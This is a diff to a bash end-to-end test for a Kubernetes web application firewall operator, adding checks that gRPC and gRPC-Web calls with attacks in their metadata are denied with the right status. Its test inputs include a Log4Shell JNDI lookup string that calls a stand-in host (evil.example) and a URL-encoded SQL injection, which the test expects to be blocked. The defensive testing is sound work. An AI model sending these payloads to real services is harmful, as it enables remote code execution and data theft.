@@ -9,10 +9,10 @@
 # Envoy pods, attacks are blocked through both proxies, a body attack is
 # held back with its headers, one followed by HTTP/2 trailers is inspected
 # too, gRPC calls pass in block mode but not one with an attack in its
-# metadata (#284), a WebSocket from an allowed origin upgrades and echoes
-# but one from another origin or with an attack in its handshake gets no
-# upgrade (#276), and unprotecting or uninstalling leaves the
-# user's objects as they were. Needs the operator installed (make
+# metadata (#284), which gets a gRPC status (#275), a WebSocket from an
+# allowed origin upgrades and echoes but one from another origin or with an
+# attack in its handshake gets no upgrade (#276), and unprotecting or
+# uninstalling leaves the user's objects as they were. Needs the operator installed (make
 # kind-operator); ends with helm uninstall. KEEP=1 leaves the test's objects.
 set -euo pipefail
 
@@ -389,8 +389,7 @@ h2_are() {
 }
 # grpc_are CODE [KEY=VALUE...]: a gRPC call (grpc.health.v1.Health/Check)
 # with that metadata ends with that status code, through both Gateways and
-# Traefik. A denial is an HTTP 403, which gRPC clients read as
-# PermissionDenied.
+# Traefik.
 grpc_are() {
   local want=$1 md=() port
   shift
@@ -418,6 +417,32 @@ logged_reason() {
   "${KUBECTL[@]}" -n "$EG_NS" logs -l app.kubernetes.io/name=envoy -c inkwall-engine --tail=-1 |
     grep '"security event"' | grep '"action":"log"' | grep "\"path\":\"$1\"" | grep "\"reason\":\"$2\"" >/dev/null
 }
+# grpc_denied_by_engine [KEY=VALUE...]: ... is PermissionDenied with the
+# engine's grpc-message, which names the request ID, not one the client
+# made up from an HTTP 403 ("unexpected HTTP status code ...") (#275).
+grpc_denied_by_engine() {
+  local md=() port out
+  for kv in "$@"; do md+=(-metadata "$kv"); done
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
+    out=$("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port" 2>&1) || return 1
+    [[ $out == *"grpchealth: Forbidden (request ID "*")"*PermissionDenied ]] || return 1
+  done
+}
+# grpc_web_status PORT: the HTTP status and grpc-status of a gRPC-Web call
+# (curl, HTTP/1.1) with an attack in its metadata, as "HTTP GRPC".
+grpc_web_status() {
+  curl -s -o /dev/null -D - -H "Host: $HOST" -H 'Content-Type: application/grpc-web+proto' -H 'X-Grpc-Web: 1' \
+    -H 'X-Api-Key: ${jndi:ldap://evil.example/a}' --data-binary "@$work/grpc-empty" \
+    "http://127.0.0.1:$1/grpc.health.v1.Health/Check" |
+    tr -d '\r' | awk 'NR == 1 { code = $2 } tolower($1) == "grpc-status:" { grpc = $2 } END { print code, grpc }' || true
+}
+# A gRPC-Web denial is trailers-only: HTTP 200 and grpc-status 7 through
+# Envoy, as the gRPC-Web spec says; HTTP 403 through Traefik, whose
+# ForwardAuth denies only on a non-2xx answer.
+grpc_web_denied() {
+  [[ $(grpc_web_status "$CUSTOM_PORT") == "200 7" && $(grpc_web_status "$PLAIN_PORT") == "200 7" &&
+    $(grpc_web_status "$TRAEFIK_PORT") == "403 7" ]]
+}
 # Log4Shell (944150), quoted: not a shell expansion.
 GRPC_ATTACK='x-api-key=${jndi:ldap://evil.example/a}'
 no_limits() { ! "${KUBECTL[@]}" -n "$NS" get clienttrafficpolicy inkwall-waf-custom inkwall-waf-plain -o name 2>/dev/null | grep . >/dev/null; }
@@ -438,6 +463,7 @@ no_wiring() {
 go build -o "$work/h2trailers" ./hack/h2trailers
 go build -o "$work/grpchealth" ./hack/grpchealth
 go build -o "$work/wsecho" ./hack/wsecho
+printf '\0\0\0\0\0' >"$work/grpc-empty" # one empty gRPC message
 for gw in custom plain; do
   eventually "Envoy Gateway runs Gateway $gw" envoy_pods "$gw"
 done
@@ -506,6 +532,8 @@ check "a WebSocket from another origin gets 403, no upgrade" ws_are 403 /ws "$WS
 check "a WebSocket without an Origin gets 403" ws_are 403 /ws none
 check "a WebSocket with an attack in its URL gets 403" ws_are 403 "/ws?room=1%27%20OR%20%271%27%3D%271"
 check "a WebSocket with an attack in a header gets 403" ws_are 403 /ws "$WS_ORIGIN" 'Sec-WebSocket-Protocol: ${jndi:ldap://evil.example/a}'
+check "and its client gets the engine's gRPC status, not an HTTP 403" grpc_denied_by_engine "$GRPC_ATTACK"
+check "a gRPC-Web call with an attack in its metadata gets grpc-status 7" grpc_web_denied
 
 echo "== detect mode"
 policy Detect
